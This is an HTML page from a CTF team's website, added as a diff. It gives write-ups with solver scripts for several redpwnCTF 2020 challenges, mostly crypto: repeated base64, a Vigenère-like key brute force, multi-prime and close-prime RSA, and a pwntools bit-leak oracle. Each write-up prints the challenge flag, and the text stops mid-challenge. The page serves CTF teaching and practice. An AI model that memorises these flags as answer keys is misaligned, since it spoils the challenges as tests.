@@ -1,0 +1,1105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    
+    <link href="https://fonts.googleapis.com/css?family=Fira+Code|Londrina+Solid:wght@900|IBM+Plex+Sans:ital,wght@0,500;0,700;1,500;1,700|Rowdies&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/base.css">
+
+    <script
+        src="https://code.jquery.com/jquery-3.5.1.slim.min.js"
+        integrity="sha256-4+XzXVhsDmqanXGHaHvgh1gMQKX40OUvDEBTu8JcmNs="
+        crossorigin="anonymous"></script>
+    
+    <title>(mendung)10^6</title>
+</head>
+<body>
+    <div class="header-content">
+        <center>
+            <div class="team-name">
+                <span>(mendung)10^6 === Mega Mendung</span>
+            </div>
+        </center>
+        <div class="menu-container">
+            <a href="/aboutus.html">
+                <div class="menu-button">
+                    <span class="text-menu aboutus">ABOUT US</span>
+                </div>
+            </a>
+            <a href="/notes.html">
+                <div class="menu-button">
+                    <span class="text-menu notes">NOTES</span>
+                </div>
+            </a>
+            <a href="/writeup.html">
+                <div class="menu-button">
+                    <span class="text-menu writeup">WRITEUP</span>
+                </div>
+            </a>
+            <a href="/news.html">
+                <div class="menu-button">
+                    <span class="text-menu news">NEWS</span>
+                </div>
+            </a>
+            <a href="/contact.html">
+                <div class="menu-button">
+                    <span class="text-menu contact">CONTACT</span>
+                </div>
+            </a>
+        </div>
+    </div>
+    <div class="main-content text-normal">
+        <div>
+    <h1>ropes</h1>
+
+<blockquote>
+  <p>It's not just a string, it's a rope!  </p>
+</blockquote>
+
+<p>You can solve this by using command <code>strings ./ropes</code> <br />
+flag : <code>flag{r0pes_ar3_just_l0ng_str1ngs}</code>  </p>
+
+<h1>bubbly</h1>
+
+<blockquote>
+  <p>It never ends <br />
+  nc 2020.redpwnc.tf 31039 <br />
+  After looking at a dissasembler, this program basically make a manual bubble sort, our input <code>i</code> is an integer that will be used as index to swap 2 integer on the <code>nums</code> array. <br />
+  Instead of searching for bubble sort code online and modify it so we can see the index swapped, I ended up doing the whole thing by hand, here's what I came up:  </p>
+</blockquote>
+
+<pre><code>$ nc 2020.redpwnc.tf 31039
+I hate my data structures class! Why can't I just sort by hand?
+2
+1
+2
+3
+4
+5
+6
+7
+8
+4
+5
+6
+7
+4
+5
+6
+4
+5
+3
+9
+Well done!
+</code></pre>
+
+<p>flag : <code>flag{4ft3r_y0u_put_u54c0_0n_y0ur_c011ege_4pp5_y0u_5t1ll_h4ve_t0_d0_th15_57uff}</code></p>
+
+<h1>base646464</h1>
+
+<blockquote>
+  <p>Encoding something multiple times makes it exponentially more secure!  </p>
+</blockquote>
+
+<p>just decode the ciphertext 25 times.  </p>
+
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;cipher.txt&quot;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">c</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">25</span><span class="p">):</span>
+                <span class="n">c</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+        <span class="nb">print</span> <span class="p">(</span><span class="n">c</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</code></pre></div>
+
+<p>flag : <code>flag{l00ks_l1ke_a_l0t_of_64s}</code>  </p>
+
+<h1>pseudo-key</h1>
+
+<blockquote>
+  <p>Keys are not always as they seem... <br />
+  Note: Make sure to wrap the plaintext with flag{} before you submit!  </p>
+</blockquote>
+
+<p>The first thing we need to do is to find the key, however each key map to 2 possibilites, for example, if the encrypted key is <code>a</code> then the possibilities will be either <code>a</code> or <code>n</code> because <code>0 + 0 % 26 = 0</code> and <code>13 + 13 %26 = 0</code>. So we have to find those 2 possibilities, and then try all possible combinations from those 2 possibilities. <br />
+I just bruteforce everything with my ugly script    </p>
+
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">string</span> <span class="kn">import</span> <span class="n">ascii_lowercase</span>
+
+<span class="n">chr_to_num</span> <span class="o">=</span> <span class="p">{</span><span class="n">c</span><span class="p">:</span> <span class="n">i</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">ascii_lowercase</span><span class="p">)}</span>
+<span class="n">num_to_chr</span> <span class="o">=</span> <span class="p">{</span><span class="n">i</span><span class="p">:</span> <span class="n">c</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">ascii_lowercase</span><span class="p">)}</span>
+
+<span class="n">cipher</span> <span class="o">=</span> <span class="s2">&quot;z_jjaoo_rljlhr_gauf_twv_shaqzb_ljtyut&quot;</span>
+<span class="n">enc_key</span> <span class="o">=</span> <span class="s2">&quot;iigesssaemk&quot;</span>
+<span class="n">key</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+<span class="c1"># candidates = []</span>
+<span class="c1"># for i in enc_key:</span>
+<span class="c1">#   for j in ascii_lowercase:</span>
+<span class="c1">#       if num_to_chr[(chr_to_num[j]*2)%26] == i:</span>
+<span class="c1">#           candidates.append(j)</span>
+<span class="c1">#           # key += j</span>
+<span class="c1">#   print (candidates)</span>
+<span class="c1">#   candidates = []</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span><span class="p">[</span><span class="s1">&#39;e&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">]:</span>
+    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span><span class="p">[</span><span class="s1">&#39;e&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">]:</span>
+        <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span><span class="p">[</span><span class="s1">&#39;d&#39;</span><span class="p">,</span> <span class="s1">&#39;q&#39;</span><span class="p">]:</span>
+            <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">,</span> <span class="s1">&#39;p&#39;</span><span class="p">]:</span>
+                <span class="k">for</span> <span class="n">m</span> <span class="ow">in</span><span class="p">[</span><span class="s1">&#39;j&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">]:</span>
+                    <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span><span class="p">[</span><span class="s1">&#39;j&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">]:</span>
+                        <span class="k">for</span> <span class="n">o</span> <span class="ow">in</span><span class="p">[</span><span class="s1">&#39;j&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">]:</span>
+                            <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="s1">&#39;n&#39;</span><span class="p">]:</span>
+                                <span class="k">for</span> <span class="n">q</span> <span class="ow">in</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">,</span> <span class="s1">&#39;p&#39;</span><span class="p">]:</span>
+                                    <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span><span class="p">[</span><span class="s1">&#39;g&#39;</span><span class="p">,</span> <span class="s1">&#39;t&#39;</span><span class="p">]:</span>
+                                        <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">,</span> <span class="s1">&#39;s&#39;</span><span class="p">]:</span>
+                                            <span class="n">key</span> <span class="o">=</span> <span class="n">i</span><span class="o">+</span><span class="n">j</span><span class="o">+</span><span class="n">k</span><span class="o">+</span><span class="n">l</span><span class="o">+</span><span class="n">m</span><span class="o">+</span><span class="n">n</span><span class="o">+</span><span class="n">o</span><span class="o">+</span><span class="n">p</span><span class="o">+</span><span class="n">q</span><span class="o">+</span><span class="n">r</span><span class="o">+</span><span class="n">s</span>
+                                            <span class="n">key</span> <span class="o">=</span> <span class="n">key</span><span class="o">*</span><span class="p">((</span><span class="nb">len</span><span class="p">(</span><span class="n">cipher</span><span class="p">)</span><span class="o">//</span><span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">))</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
+                                            <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">cipher</span><span class="p">)):</span>
+                                                <span class="k">if</span> <span class="n">cipher</span><span class="p">[</span><span class="n">c</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;_&#39;</span><span class="p">:</span>
+                                                    <span class="n">flag</span> <span class="o">+=</span> <span class="s1">&#39;_&#39;</span>
+                                                    <span class="k">continue</span>
+                                                <span class="k">for</span> <span class="n">randkey</span> <span class="ow">in</span> <span class="n">ascii_lowercase</span><span class="p">:</span>
+                                                    <span class="k">if</span> <span class="n">num_to_chr</span><span class="p">[(</span><span class="n">chr_to_num</span><span class="p">[</span><span class="n">randkey</span><span class="p">]</span><span class="o">+</span><span class="n">chr_to_num</span><span class="p">[</span><span class="n">key</span><span class="p">[</span><span class="n">c</span><span class="p">]])</span><span class="o">%</span><span class="mi">26</span><span class="p">]</span> <span class="o">==</span> <span class="n">cipher</span><span class="p">[</span><span class="n">c</span><span class="p">]:</span>
+                                                        <span class="n">flag</span> <span class="o">+=</span> <span class="n">randkey</span>
+                                                        <span class="k">break</span>
+                                            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;flag{&#39;</span><span class="o">+</span><span class="n">flag</span><span class="o">+</span><span class="s1">&#39;}&#39;</span><span class="p">)</span>
+                                            <span class="n">flag</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+</code></pre></div>
+
+<p>But it works! <br />
+flag = <code>flag{i_guess_pseudo_keys_are_pseudo_secure}</code>  </p>
+
+<h1>4k-rsa</h1>
+
+<blockquote>
+  <p>Only n00bz use 2048-bit RSA. True gamers use keys that are at least 4k bits long, no matter how many primes it takes.  </p>
+</blockquote>
+
+<p>using <a target="_blank" href="factordb.com">factordb</a> we can see that there are many prime factors of n, the way we can decrypt the ciphertext is pretty much the same with normal RSA, just multiply each factor-1 to calculate phi.  </p>
+
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span> <span class="k">as</span> <span class="n">ltb</span>
+<span class="n">n</span> <span class="o">=</span> <span class="mi">5028492424316659784848610571868499830635784588253436599431884204425304126574506051458282629520844349077718907065343861952658055912723193332988900049704385076586516440137002407618568563003151764276775720948938528351773075093802636408325577864234115127871390168096496816499360494036227508350983216047669122408034583867561383118909895952974973292619495653073541886055538702432092425858482003930575665792421982301721054750712657799039327522613062264704797422340254020326514065801221180376851065029216809710795296030568379075073865984532498070572310229403940699763425130520414160563102491810814915288755251220179858773367510455580835421154668619370583787024315600566549750956030977653030065606416521363336014610142446739352985652335981500656145027999377047563266566792989553932335258615049158885853966867137798471757467768769820421797075336546511982769835420524203920252434351263053140580327108189404503020910499228438500946012560331269890809392427093030932508389051070445428793625564099729529982492671019322403728879286539821165627370580739998221464217677185178817064155665872550466352067822943073454133105879256544996546945106521271564937390984619840428052621074566596529317714264401833493628083147272364024196348602285804117877</span>
+<span class="n">e</span><span class="o">=</span> <span class="mi">65537</span>
+<span class="n">c</span><span class="o">=</span> <span class="mi">3832859959626457027225709485375429656323178255126603075378663780948519393653566439532625900633433079271626752658882846798954519528892785678004898021308530304423348642816494504358742617536632005629162742485616912893249757928177819654147103963601401967984760746606313579479677305115496544265504651189209247851288266375913337224758155404252271964193376588771249685826128994580590505359435624950249807274946356672459398383788496965366601700031989073183091240557732312196619073008044278694422846488276936308964833729880247375177623028647353720525241938501891398515151145843765402243620785039625653437188509517271172952425644502621053148500664229099057389473617140142440892790010206026311228529465208203622927292280981837484316872937109663262395217006401614037278579063175500228717845448302693565927904414274956989419660185597039288048513697701561336476305496225188756278588808894723873597304279725821713301598203214138796642705887647813388102769640891356064278925539661743499697835930523006188666242622981619269625586780392541257657243483709067962183896469871277059132186393541650668579736405549322908665664807483683884964791989381083279779609467287234180135259393984011170607244611693425554675508988981095977187966503676074747171</span>
+<span class="n">primes</span> <span class="o">=</span> <span class="p">[</span><span class="mi">9353689450544968301</span><span class="p">,</span> <span class="mi">9431486459129385713</span><span class="p">,</span> <span class="mi">9563871376496945939</span><span class="p">,</span> <span class="mi">9734621099746950389</span><span class="p">,</span> <span class="mi">9736426554597289187</span><span class="p">,</span> <span class="mi">10035211751896066517</span><span class="p">,</span> <span class="mi">10040518276351167659</span><span class="p">,</span> <span class="mi">10181432127731860643</span><span class="p">,</span> <span class="mi">10207091564737615283</span><span class="p">,</span> <span class="mi">10435329529687076341</span><span class="p">,</span> <span class="mi">10498390163702844413</span><span class="p">,</span> <span class="mi">10795203922067072869</span><span class="p">,</span> <span class="mi">11172074163972443279</span><span class="p">,</span> <span class="mi">11177660664692929397</span><span class="p">,</span> <span class="mi">11485099149552071347</span><span class="p">,</span> <span class="mi">11616532426455948319</span><span class="p">,</span> <span class="mi">11964233629849590781</span><span class="p">,</span> <span class="mi">11992188644420662609</span><span class="p">,</span> <span class="mi">12084363952563914161</span><span class="p">,</span> <span class="mi">12264277362666379411</span><span class="p">,</span> <span class="mi">12284357139600907033</span><span class="p">,</span> <span class="mi">12726850839407946047</span><span class="p">,</span> <span class="mi">13115347801685269351</span><span class="p">,</span> <span class="mi">13330028326583914849</span><span class="p">,</span> <span class="mi">13447718068162387333</span><span class="p">,</span> <span class="mi">13554661643603143669</span><span class="p">,</span> <span class="mi">13558122110214876367</span><span class="p">,</span> <span class="mi">13579057804448354623</span><span class="p">,</span> <span class="mi">13716062103239551021</span><span class="p">,</span> <span class="mi">13789440402687036193</span><span class="p">,</span> <span class="mi">13856162412093479449</span><span class="p">,</span> <span class="mi">13857614679626144761</span><span class="p">,</span> <span class="mi">14296909550165083981</span><span class="p">,</span> <span class="mi">14302754311314161101</span><span class="p">,</span> <span class="mi">14636284106789671351</span><span class="p">,</span> <span class="mi">14764546515788021591</span><span class="p">,</span> <span class="mi">14893589315557698913</span><span class="p">,</span> <span class="mi">15067220807972526163</span><span class="p">,</span> <span class="mi">15241351646164982941</span><span class="p">,</span> <span class="mi">15407706505172751449</span><span class="p">,</span> <span class="mi">15524931816063806341</span><span class="p">,</span> <span class="mi">15525253577632484267</span><span class="p">,</span> <span class="mi">15549005882626828981</span><span class="p">,</span> <span class="mi">15687871802768704433</span><span class="p">,</span> <span class="mi">15720375559558820789</span><span class="p">,</span> <span class="mi">15734713257994215871</span><span class="p">,</span> <span class="mi">15742065469952258753</span><span class="p">,</span> <span class="mi">15861836139507191959</span><span class="p">,</span> <span class="mi">16136191597900016651</span><span class="p">,</span> <span class="mi">16154675571631982029</span><span class="p">,</span> <span class="mi">16175693991682950929</span><span class="p">,</span> <span class="mi">16418126406213832189</span><span class="p">,</span> <span class="mi">16568399117655835211</span><span class="p">,</span> <span class="mi">16618761350345493811</span><span class="p">,</span> <span class="mi">16663643217910267123</span><span class="p">,</span> <span class="mi">16750888032920189263</span><span class="p">,</span> <span class="mi">16796967566363355967</span><span class="p">,</span> <span class="mi">16842398522466619901</span><span class="p">,</span> <span class="mi">17472599467110501143</span><span class="p">,</span> <span class="mi">17616950931512191043</span><span class="p">,</span> <span class="mi">17825248785173311981</span><span class="p">,</span> <span class="mi">18268960885156297373</span><span class="p">,</span> <span class="mi">18311624754015021467</span><span class="p">,</span> <span class="mi">18415126952549973977</span><span class="p">]</span>
+<span class="n">phi</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">primes</span><span class="p">:</span>
+    <span class="n">phi</span> <span class="o">*=</span> <span class="n">i</span><span class="o">-</span><span class="mi">1</span>
+
+<span class="k">def</span> <span class="nf">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">g</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">x</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">b</span> <span class="o">%</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">)</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="n">x</span> <span class="o">-</span> <span class="p">(</span><span class="n">b</span> <span class="o">//</span> <span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="n">y</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">modinv</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">):</span>
+    <span class="n">g</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">g</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s1">&#39;modular inverse does not exist&#39;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">x</span> <span class="o">%</span> <span class="n">m</span>
+<span class="n">d</span> <span class="o">=</span> <span class="n">modinv</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="n">phi</span><span class="p">)</span>
+<span class="nb">print</span> <span class="p">(</span><span class="n">ltb</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">n</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</code></pre></div>
+
+<p>flag : <code>flag{t0000_m4nyyyy_pr1m355555}</code></p>
+
+<h1>primimity</h1>
+
+<blockquote>
+  <p>People claim that RSA with two 1024-bit primes is secure. But I trust no one. That's why I use three 1024-bit primes. <br />
+  I even created my own prime generator to be extra cautious!  </p>
+</blockquote>
+
+<p>if we look at the source code, we can see that each prime is only differ by a few primes away, the way we can factor it is by taking the cube root of n, then keep calling nextprime() until it become one of the factor of n. you can see the code that I wrote to bruteforce that in the commented code below :  </p>
+
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">sympy</span> <span class="kn">import</span> <span class="n">nextprime</span>
+<span class="kn">from</span> <span class="nn">gmpy2</span> <span class="kn">import</span> <span class="n">root</span>
+<span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span> <span class="k">as</span> <span class="n">ltb</span>
+<span class="n">n</span><span class="o">=</span> <span class="mi">2739699434633097765008468371124644741923408864896396205946954196101304653772173210372608955799251139999322976228678445908704975780068946332615022064030241384638601426716056067126300711933438732265846838735860353259574129074615298010047322960704972157930663061480726566962254887144927753449042590678730779046154516549667611603792754880414526688217305247008627664864637891883902537649625488225238118503996674292057904635593729208703096877231276911845233833770015093213639131244386867600956112884383105437861665666273910566732634878464610789895607273567372933766243229798663389032807187003756226177111720510187664096691560511459141773632683383938152396711991246874813205614169161561906148974478519987935950318569760474249427787310865749167740917232799538099494710964837536211535351200520324575676987080484141561336505103872809932354748531675934527453231255132361489570816639925234935907741385330442961877410196615649696508210921</span>
+<span class="n">q</span> <span class="o">=</span> <span class="mi">139926822890670655977195962770726941986198973494425759476822219188316377933161673759394901805855617939978281385708941597117531007973713846772205166659227214187622925135931456526921198848312215276630974951050306344412865900075089120689559331322162952820292429725303619113876104177529039691490258588465409494847</span>
+<span class="n">r</span> <span class="o">=</span> <span class="mi">139926822890670655977195962770726941986198973494425759476822219188316377933161673759394901805855617939978281385708941597117531007973713846772205166659227214187622925135931456526921198848312215276630974951050306344412865900075089120689559331322162952820292429725303619113876104177529039691490258588465409397803</span>
+<span class="n">p</span> <span class="o">=</span> <span class="p">(</span><span class="n">n</span><span class="o">/</span><span class="n">q</span><span class="p">)</span><span class="o">/</span><span class="n">r</span>
+<span class="k">assert</span> <span class="n">p</span><span class="o">*</span><span class="n">q</span><span class="o">*</span><span class="n">r</span> <span class="o">==</span> <span class="n">n</span>
+<span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
+<span class="n">c</span> <span class="o">=</span> <span class="mi">2082926013138674164997791605512226759362824531322433048281306983526001801581956788909408046338065370689701410862433705395338736589120086871506362760060657440410056869674907314204346790554619655855805666327905912762300412323371126871463045993946331927129882715778396764969311565407104426500284824495461252591576672989633930916837016411523983491364869137945678029616541477271287052575817523864089061675401543733151180624855361245733039022140321494471318934716652758163593956711915212195328671373739342124211743835858897895276513396783328942978903764790088495033176253777832808572717335076829539988337505582696026111326821783912902713222712310343791755341823415393931813610365987465739339849380173805882522026704474308541271732478035913770922189429089852921985416202844838873352090355685075965831663443962706473737852392107876993485163981653038588544562512597409585410384189546449890975409183661424334789750460016306977673969147</span>
+<span class="c1"># p = root(n,3)</span>
+<span class="c1"># tries = 0</span>
+<span class="c1"># while n%p != 0:</span>
+<span class="c1">#   tries += 1</span>
+<span class="c1">#   print tries</span>
+<span class="c1">#   p = nextprime(p)</span>
+<span class="c1"># print &quot;------------------------------------------------------------------------------------------------------------&quot;</span>
+<span class="c1"># print p</span>
+
+<span class="k">def</span> <span class="nf">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">g</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">x</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">b</span> <span class="o">%</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">)</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="n">x</span> <span class="o">-</span> <span class="p">(</span><span class="n">b</span> <span class="o">//</span> <span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="n">y</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">modinv</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">):</span>
+    <span class="n">g</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">g</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s1">&#39;modular inverse does not exist&#39;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">x</span> <span class="o">%</span> <span class="n">m</span>
+<span class="n">phi</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">r</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">d</span> <span class="o">=</span> <span class="n">modinv</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="n">phi</span><span class="p">)</span>
+<span class="nb">print</span> <span class="n">ltb</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">n</span><span class="p">))</span>
+</code></pre></div>
+
+<p>flag : <code>flag{pr1m3_pr0x1m1ty_c4n_b3_v3ry_d4ng3r0u5}</code>  </p>
+
+<h1>itsy-bitsy</h1>
+
+<blockquote>
+  <p>The itsy-bitsy spider climbed up the water spout... <br />
+  nc 2020.redpwnc.tf 31284  </p>
+</blockquote>
+
+<p>If you look at the source code, any number between lower bound and upperbound have the same first bit, which is 1, so for example if <code>i = 1</code> and <code>j = 2</code>, then the range are <code>0b10</code> to <code>0b11</code>, so no matter what for first bit and each two index after, the flag bit will be xored by 1, and so for every prime number we can leak every single byte, and the only bit that can't be leaked is the flag_bit[1]. but it's just 2 possibilities, so we can just try both. You can see the script I used to leak all the bytes in the commented code below :</p>
+
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">sympy</span> <span class="kn">import</span> <span class="n">nextprime</span>
+<span class="kn">import</span> <span class="nn">pwn</span>
+<span class="c1">#len(flag_bits) == 301</span>
+<span class="c1"># prime = nextprime(0)</span>
+<span class="c1"># arr = [&#39;?&#39; for _ in range(301)]</span>
+<span class="c1"># while prime &lt; 301:</span>
+<span class="c1">#   try:</span>
+<span class="c1">#       print (prime)</span>
+<span class="c1">#       r = pwn.remote(&quot;2020.redpwnc.tf&quot;,31284)</span>
+<span class="c1">#       r.sendlineafter(&quot;i &gt; 0: &quot;,str(prime-1))</span>
+<span class="c1">#       r.sendlineafter(&quot;i &gt; 0: &quot;,str(prime))</span>
+<span class="c1">#       c = r.recv()[len(&quot;Ciphertext: &quot;):]</span>
+<span class="c1">#       for i in range(0,len(arr),prime):</span>
+<span class="c1">#           arr[i] = str(int(c[i])^1)</span>
+<span class="c1">#       print (&#39;&#39;.join(arr))</span>
+<span class="c1">#       prime = nextprime(prime)</span>
+<span class="c1">#       r.close()</span>
+<span class="c1">#   except:</span>
+<span class="c1">#       continue</span>
+<span class="c1"># final output : &#39;1?00110110110011000011100111111101111000101101001111010011100111011111110110011001011100001110101111010011101110110011110111111101111111010111101001011111110010011011111110111110111010111111110100110100011001011011111111011111000011110100110010111100101011111111001111100001101111111010111101001111101&#39;</span>
+<span class="n">arr1</span> <span class="o">=</span> <span class="s1">&#39;1000110110110011000011100111111101111000101101001111010011100111011111110110011001011100001110101111010011101110110011110111111101111111010111101001011111110010011011111110111110111010111111110100110100011001011011111111011111000011110100110010111100101011111111001111100001101111111010111101001111101&#39;</span>
+<span class="n">arr2</span> <span class="o">=</span> <span class="s1">&#39;1100110110110011000011100111111101111000101101001111010011100111011111110110011001011100001110101111010011101110110011110111111101111111010111101001011111110010011011111110111110111010111111110100110100011001011011111111011111000011110100110010111100101011111111001111100001101111111010111101001111101&#39;</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+<span class="n">arr1</span> <span class="o">=</span> <span class="p">[</span><span class="n">arr1</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">7</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">arr1</span><span class="p">),</span><span class="mi">7</span><span class="p">)]</span>
+<span class="n">arr2</span> <span class="o">=</span> <span class="p">[</span><span class="n">arr2</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">7</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">arr2</span><span class="p">),</span><span class="mi">7</span><span class="p">)]</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">arr1</span><span class="p">:</span>
+    <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="mi">2</span><span class="p">))</span>
+<span class="nb">print</span> <span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">arr2</span><span class="p">:</span>
+    <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="mi">2</span><span class="p">))</span>
+<span class="nb">print</span> <span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</code></pre></div>
+
+<p>flag : <code>flag{bits_leaking_out_down_the_water_spout}</code></p>
+
+<h1>alien-transmissions-v2</h1>
+
+<blockquote>
+  <p>The aliens are at it again! We've discovered that their communications are in base 512 and have transcribed them in base 10. However, it seems like they used XOR encryption twice with two different keys! We do have some information:  </p>
+  
+  <p>This alien language consists of words delimitated by the character represented as 481 <br />
